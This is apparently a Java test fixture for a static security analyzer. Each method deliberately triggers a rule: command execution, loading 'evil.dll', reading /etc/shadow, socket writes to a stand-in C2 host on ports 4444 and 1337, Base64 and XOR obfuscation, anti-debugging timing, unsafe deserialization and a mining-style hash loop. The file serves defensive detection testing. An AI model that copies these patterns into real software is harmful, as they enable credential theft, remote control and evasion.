package org.example.test;

// ---
// 1. FORBIDDEN & SUSPICIOUS IMPORTS
// ---
// These imports should be flagged by the analyzer based on config.json
// Forbidden Packages
import java.lang.reflect.Method; // [VIOLATION] Forbidden package: java.lang.reflect

// Forbidden Classes
import java.lang.Runtime; // [VIOLATION] Forbidden class: java.lang.Runtime
import java.lang.ProcessBuilder; // [VIOLATION] Forbidden class: java.lang.ProcessBuilder
import java.awt.Robot; // [VIOLATION] Forbidden class: java.awt.Robot

// Suspicious Classes
import java.net.Socket; // [VIOLATION] Suspicious class: java.net.Socket
import javax.crypto.Cipher; // [VIOLATION] Suspicious class: javax.crypto.Cipher
import java.io.ObjectInputStream; // [VIOLATION] Suspicious class: java.io.ObjectInputStream
import java.security.MessageDigest; // [VIOLATION] Suspicious class: java.security.MessageDigest

// Safe Imports (for comparison)
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.Collections;

public class TestClass {

    // ---
    // 2. HARDCODED LITERALS
    // ---
    // These string literals should be flagged by the literal scanner.

    // [VIOLATION] Hardcoded IP address
    private static final String C2_SERVER_IP = "198.51.100.1";

    // [VIOLATION] Hardcoded domain
    private static final String C2_SERVER_DOMAIN = "malicious-control-server.com";

    // [VIOLATION] Hardcoded IP (will be flagged again)
    private final String backupServer = "192.168.1.100";

    // This string is safe
    private final String safeString = "This is a normal configuration string.";

    public static void main(String[] args) {

        TestClass testClass = new TestClass();

        try {
            testClass.triggerForbiddenMethods();
            testClass.triggerSuspiciousFileAccess();
            testClass.triggerNetworkAndCrypto();
            testClass.triggerObfuscation();
            testClass.triggerAntiSandbox();
            testClass.triggerDeserialization(null);
            testClass.triggerCryptominingPattern();
            testClass.triggerReflection();
        } catch (Exception e) {
            // Suppress exceptions for testing purposes
            System.out.println("An expected error was caught: " + e.getMessage());
        }

        System.out.println("--- Test testClass Complete ---");
    }

    /**
     * 3. FORBIDDEN METHOD CALLS
     * Triggers violations for executing commands and loading libraries.
     */
    public void triggerForbiddenMethods() throws IOException {
        System.out.println("Testing forbidden methods...");

        // [VIOLATION] Forbidden method call: java.lang.Runtime.exec
        Runtime.getRuntime().exec("calc.exe");

        // [VIOLATION] Forbidden method call: java.lang.System.load
        System.load("C:\\temp\\evil.dll");
    }

    /**
     * 4. SUSPICIOUS FILE PATHS
     * Triggers violations by accessing sensitive system locations.
     */
    public void triggerSuspiciousFileAccess() throws IOException {
        System.out.println("Testing suspicious file access...");

        // [VIOLATION] Suspicious file path in constructor: /etc/
        File shadowFile = new File("/etc/shadow");
        shadowFile.canRead();

        // [VIOLATION] Suspicious file path in method: c:/windows
        Files.write(Paths.get("c:/windows/temp.txt"), Collections.singleton("test"));

        // [VIOLATION] Suspicious file path in constructor: user.home
        // The analyzer checks for the *literal string* "user.home"
        File userHomeFile = new File("C:/some/path/user.home/config.txt");
        userHomeFile.delete();
    }

    /**
     * 5. NETWORK, CRYPTO, & HARDCODED LITERALS (Usage)
     * Triggers violations for sockets, ciphers, and uses suspicious literals.
     */
    public void triggerNetworkAndCrypto() throws Exception {
        System.out.println("Testing network and crypto...");

        // Uses suspicious class Socket.
        // Also uses hardcoded IP and suspicious port 4444.
        try (Socket socket = new Socket(C2_SERVER_IP, 4444)) {
            socket.getOutputStream().write("payload".getBytes());
        }

        // Uses suspicious class Socket.
        // Also uses hardcoded domain and suspicious port 1337.
        try (Socket socket2 = new Socket(C2_SERVER_DOMAIN, 1337)) {
            socket2.getOutputStream().write("payload".getBytes());
        }

        // Uses suspicious class Cipher.
        Cipher.getInstance("AES/ECB/PKCS5Padding");
    }

    /**
     * 6. OBFUSCATION TECHNIQUES
     * Triggers violations for Base64 decoding and XOR loops.
     */
    public void triggerObfuscation() {
        System.out.println("Testing obfuscation techniques...");

        // [VIOLATION] Obfuscation method call: java.util.Base64.getDecoder
        String encoded = "Y2FsYy5leGU="; // "calc.exe"
        byte[] decoded = Base64.getDecoder().decode(encoded);
        System.out.println("Decoded: " + new String(decoded));

        // [VIOLATION] Loop contains XOR operation
        byte[] encrypted = {22, 1, 3, 16};
        for (int i = 0; i < encrypted.length; i++) {
            // This XOR operation should be flagged
            encrypted[i] = (byte) (encrypted[i] ^ 0x5A);
        }
    }

    /**
     * 7. ANTI-SANDBOX / DEBUGGING PATTERNS
     * Triggers violations for timing-based evasion.
     */
    public void triggerAntiSandbox() {
        System.out.println("Testing anti-sandbox timing...");

        // [VIOLATION] Method contains >= 2 timing calls
        long start = System.nanoTime();

        // Some trivial work
        Math.log(12345.6789);

        long end = System.nanoTime();
        if (end - start > 1_000_000) { // 1ms
            System.out.println("Debugger detected!");
        }

        // [VIOLATION] Timing call inside a loop
        for (int i = 0; i < 10; i++) {
            System.out.println("Looping...");
            if (System.currentTimeMillis() % 1000 == 0) {
                // This is a suspicious pattern
            }
        }
    }

    /**
     * 8. SUSPICIOUS DESERIALIZATION
     * Triggers violation for using ObjectInputStream.
     */
    public void triggerDeserialization(InputStream in) throws Exception {
        System.out.println("Testing deserialization...");

        // Uses suspicious class ObjectInputStream
        if (in != null) {
            ObjectInputStream ois = new ObjectInputStream(in);
            Object obj = ois.readObject();
            System.out.println("Read object: " + obj.toString());
        }
    }

    /**
     * 9. CRYPTOMINING PATTERN (Intent)
     * This loop *should* be flagged for containing Hashing + BigInteger.
     * Note: The current LoopBodyScanner doesn't seem to check for this,
     * but the pattern is included for completeness.
     */
    public void triggerCryptominingPattern() throws Exception {
        System.out.println("Testing cryptomining loop pattern...");

        // Uses suspicious class MessageDigest
        MessageDigest md = MessageDigest.getInstance("SHA-256");

        // [INTENT] This loop contains MessageDigest and BigInteger operations
        for (int i = 0; i < 100; i++) {
            String data = "block" + i;
            byte[] hash = md.digest(data.getBytes());
            // Uses suspicious class BigInteger
            BigInteger hashInt = new BigInteger(1, hash);
            if (hashInt.bitLength() < 250) {
                System.out.println("Found hash!");
            }
        }
    }

    /**
     * 10. FORBIDDEN REFLECTION (Usage)
     * Triggers violation by using the imported forbidden class.
     */
    public void triggerReflection() throws Exception {
        System.out.println("Testing reflection usage...");

        // Uses forbidden class Method (from import)
        Method m = String.class.getMethod("toUpperCase");
        System.out.println(m.invoke("test"));
    }
}